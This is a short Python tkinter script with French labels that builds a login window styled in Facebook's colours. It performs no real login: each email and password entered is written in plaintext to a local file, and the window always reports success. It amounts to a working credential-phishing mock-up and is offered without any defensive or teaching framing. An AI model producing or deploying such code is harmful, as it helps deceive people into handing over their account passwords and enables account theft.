import tkinter as tk
from tkinter import messagebox


def enregistrer_donnees(email, mot_de_passe):
    with open("donnees_connexion.txt", "a") as file:
        file.write(f"Email: {email}, Mot de passe: {mot_de_passe}\n")


def se_connecter():
    email = entry_email.get()
    mot_de_passe = entry_mot_de_passe.get()

    if email == "" or mot_de_passe == "":
        messagebox.showerror("Erreur", "Tous les champs doivent être remplis.")
    else:
        enregistrer_donnees(email, mot_de_passe)
        messagebox.showinfo("Succès", "Connexion réussie !")
        entry_email.delete(0, tk.END)
        entry_mot_de_passe.delete(0, tk.END)


# Création de la fenêtre principale
root = tk.Tk()
root.title("Page de connexion")

# Configuration de la fenêtre
root.geometry("400x400")
root.config(bg="#1877f2")  # Fond bleu de Facebook

# Création des éléments d'interface
label_email = tk.Label(root, text="Adresse e-mail", bg="#1877f2", fg="white")
label_email.pack(pady=10)

entry_email = tk.Entry(root, width=30)
entry_email.pack(pady=5)

label_mot_de_passe = tk.Label(root, text="Mot de passe", bg="#1877f2", fg="white")
label_mot_de_passe.pack(pady=5)

entry_mot_de_passe = tk.Entry(root, width=30, show="*")
entry_mot_de_passe.pack(pady=5)

button_connexion = tk.Button(root, text="Se connecter", command=se_connecter, bg="#42b72a", fg="white", width=30)
button_connexion.pack(pady=20)

# Démarrer l'interface
root.mainloop()


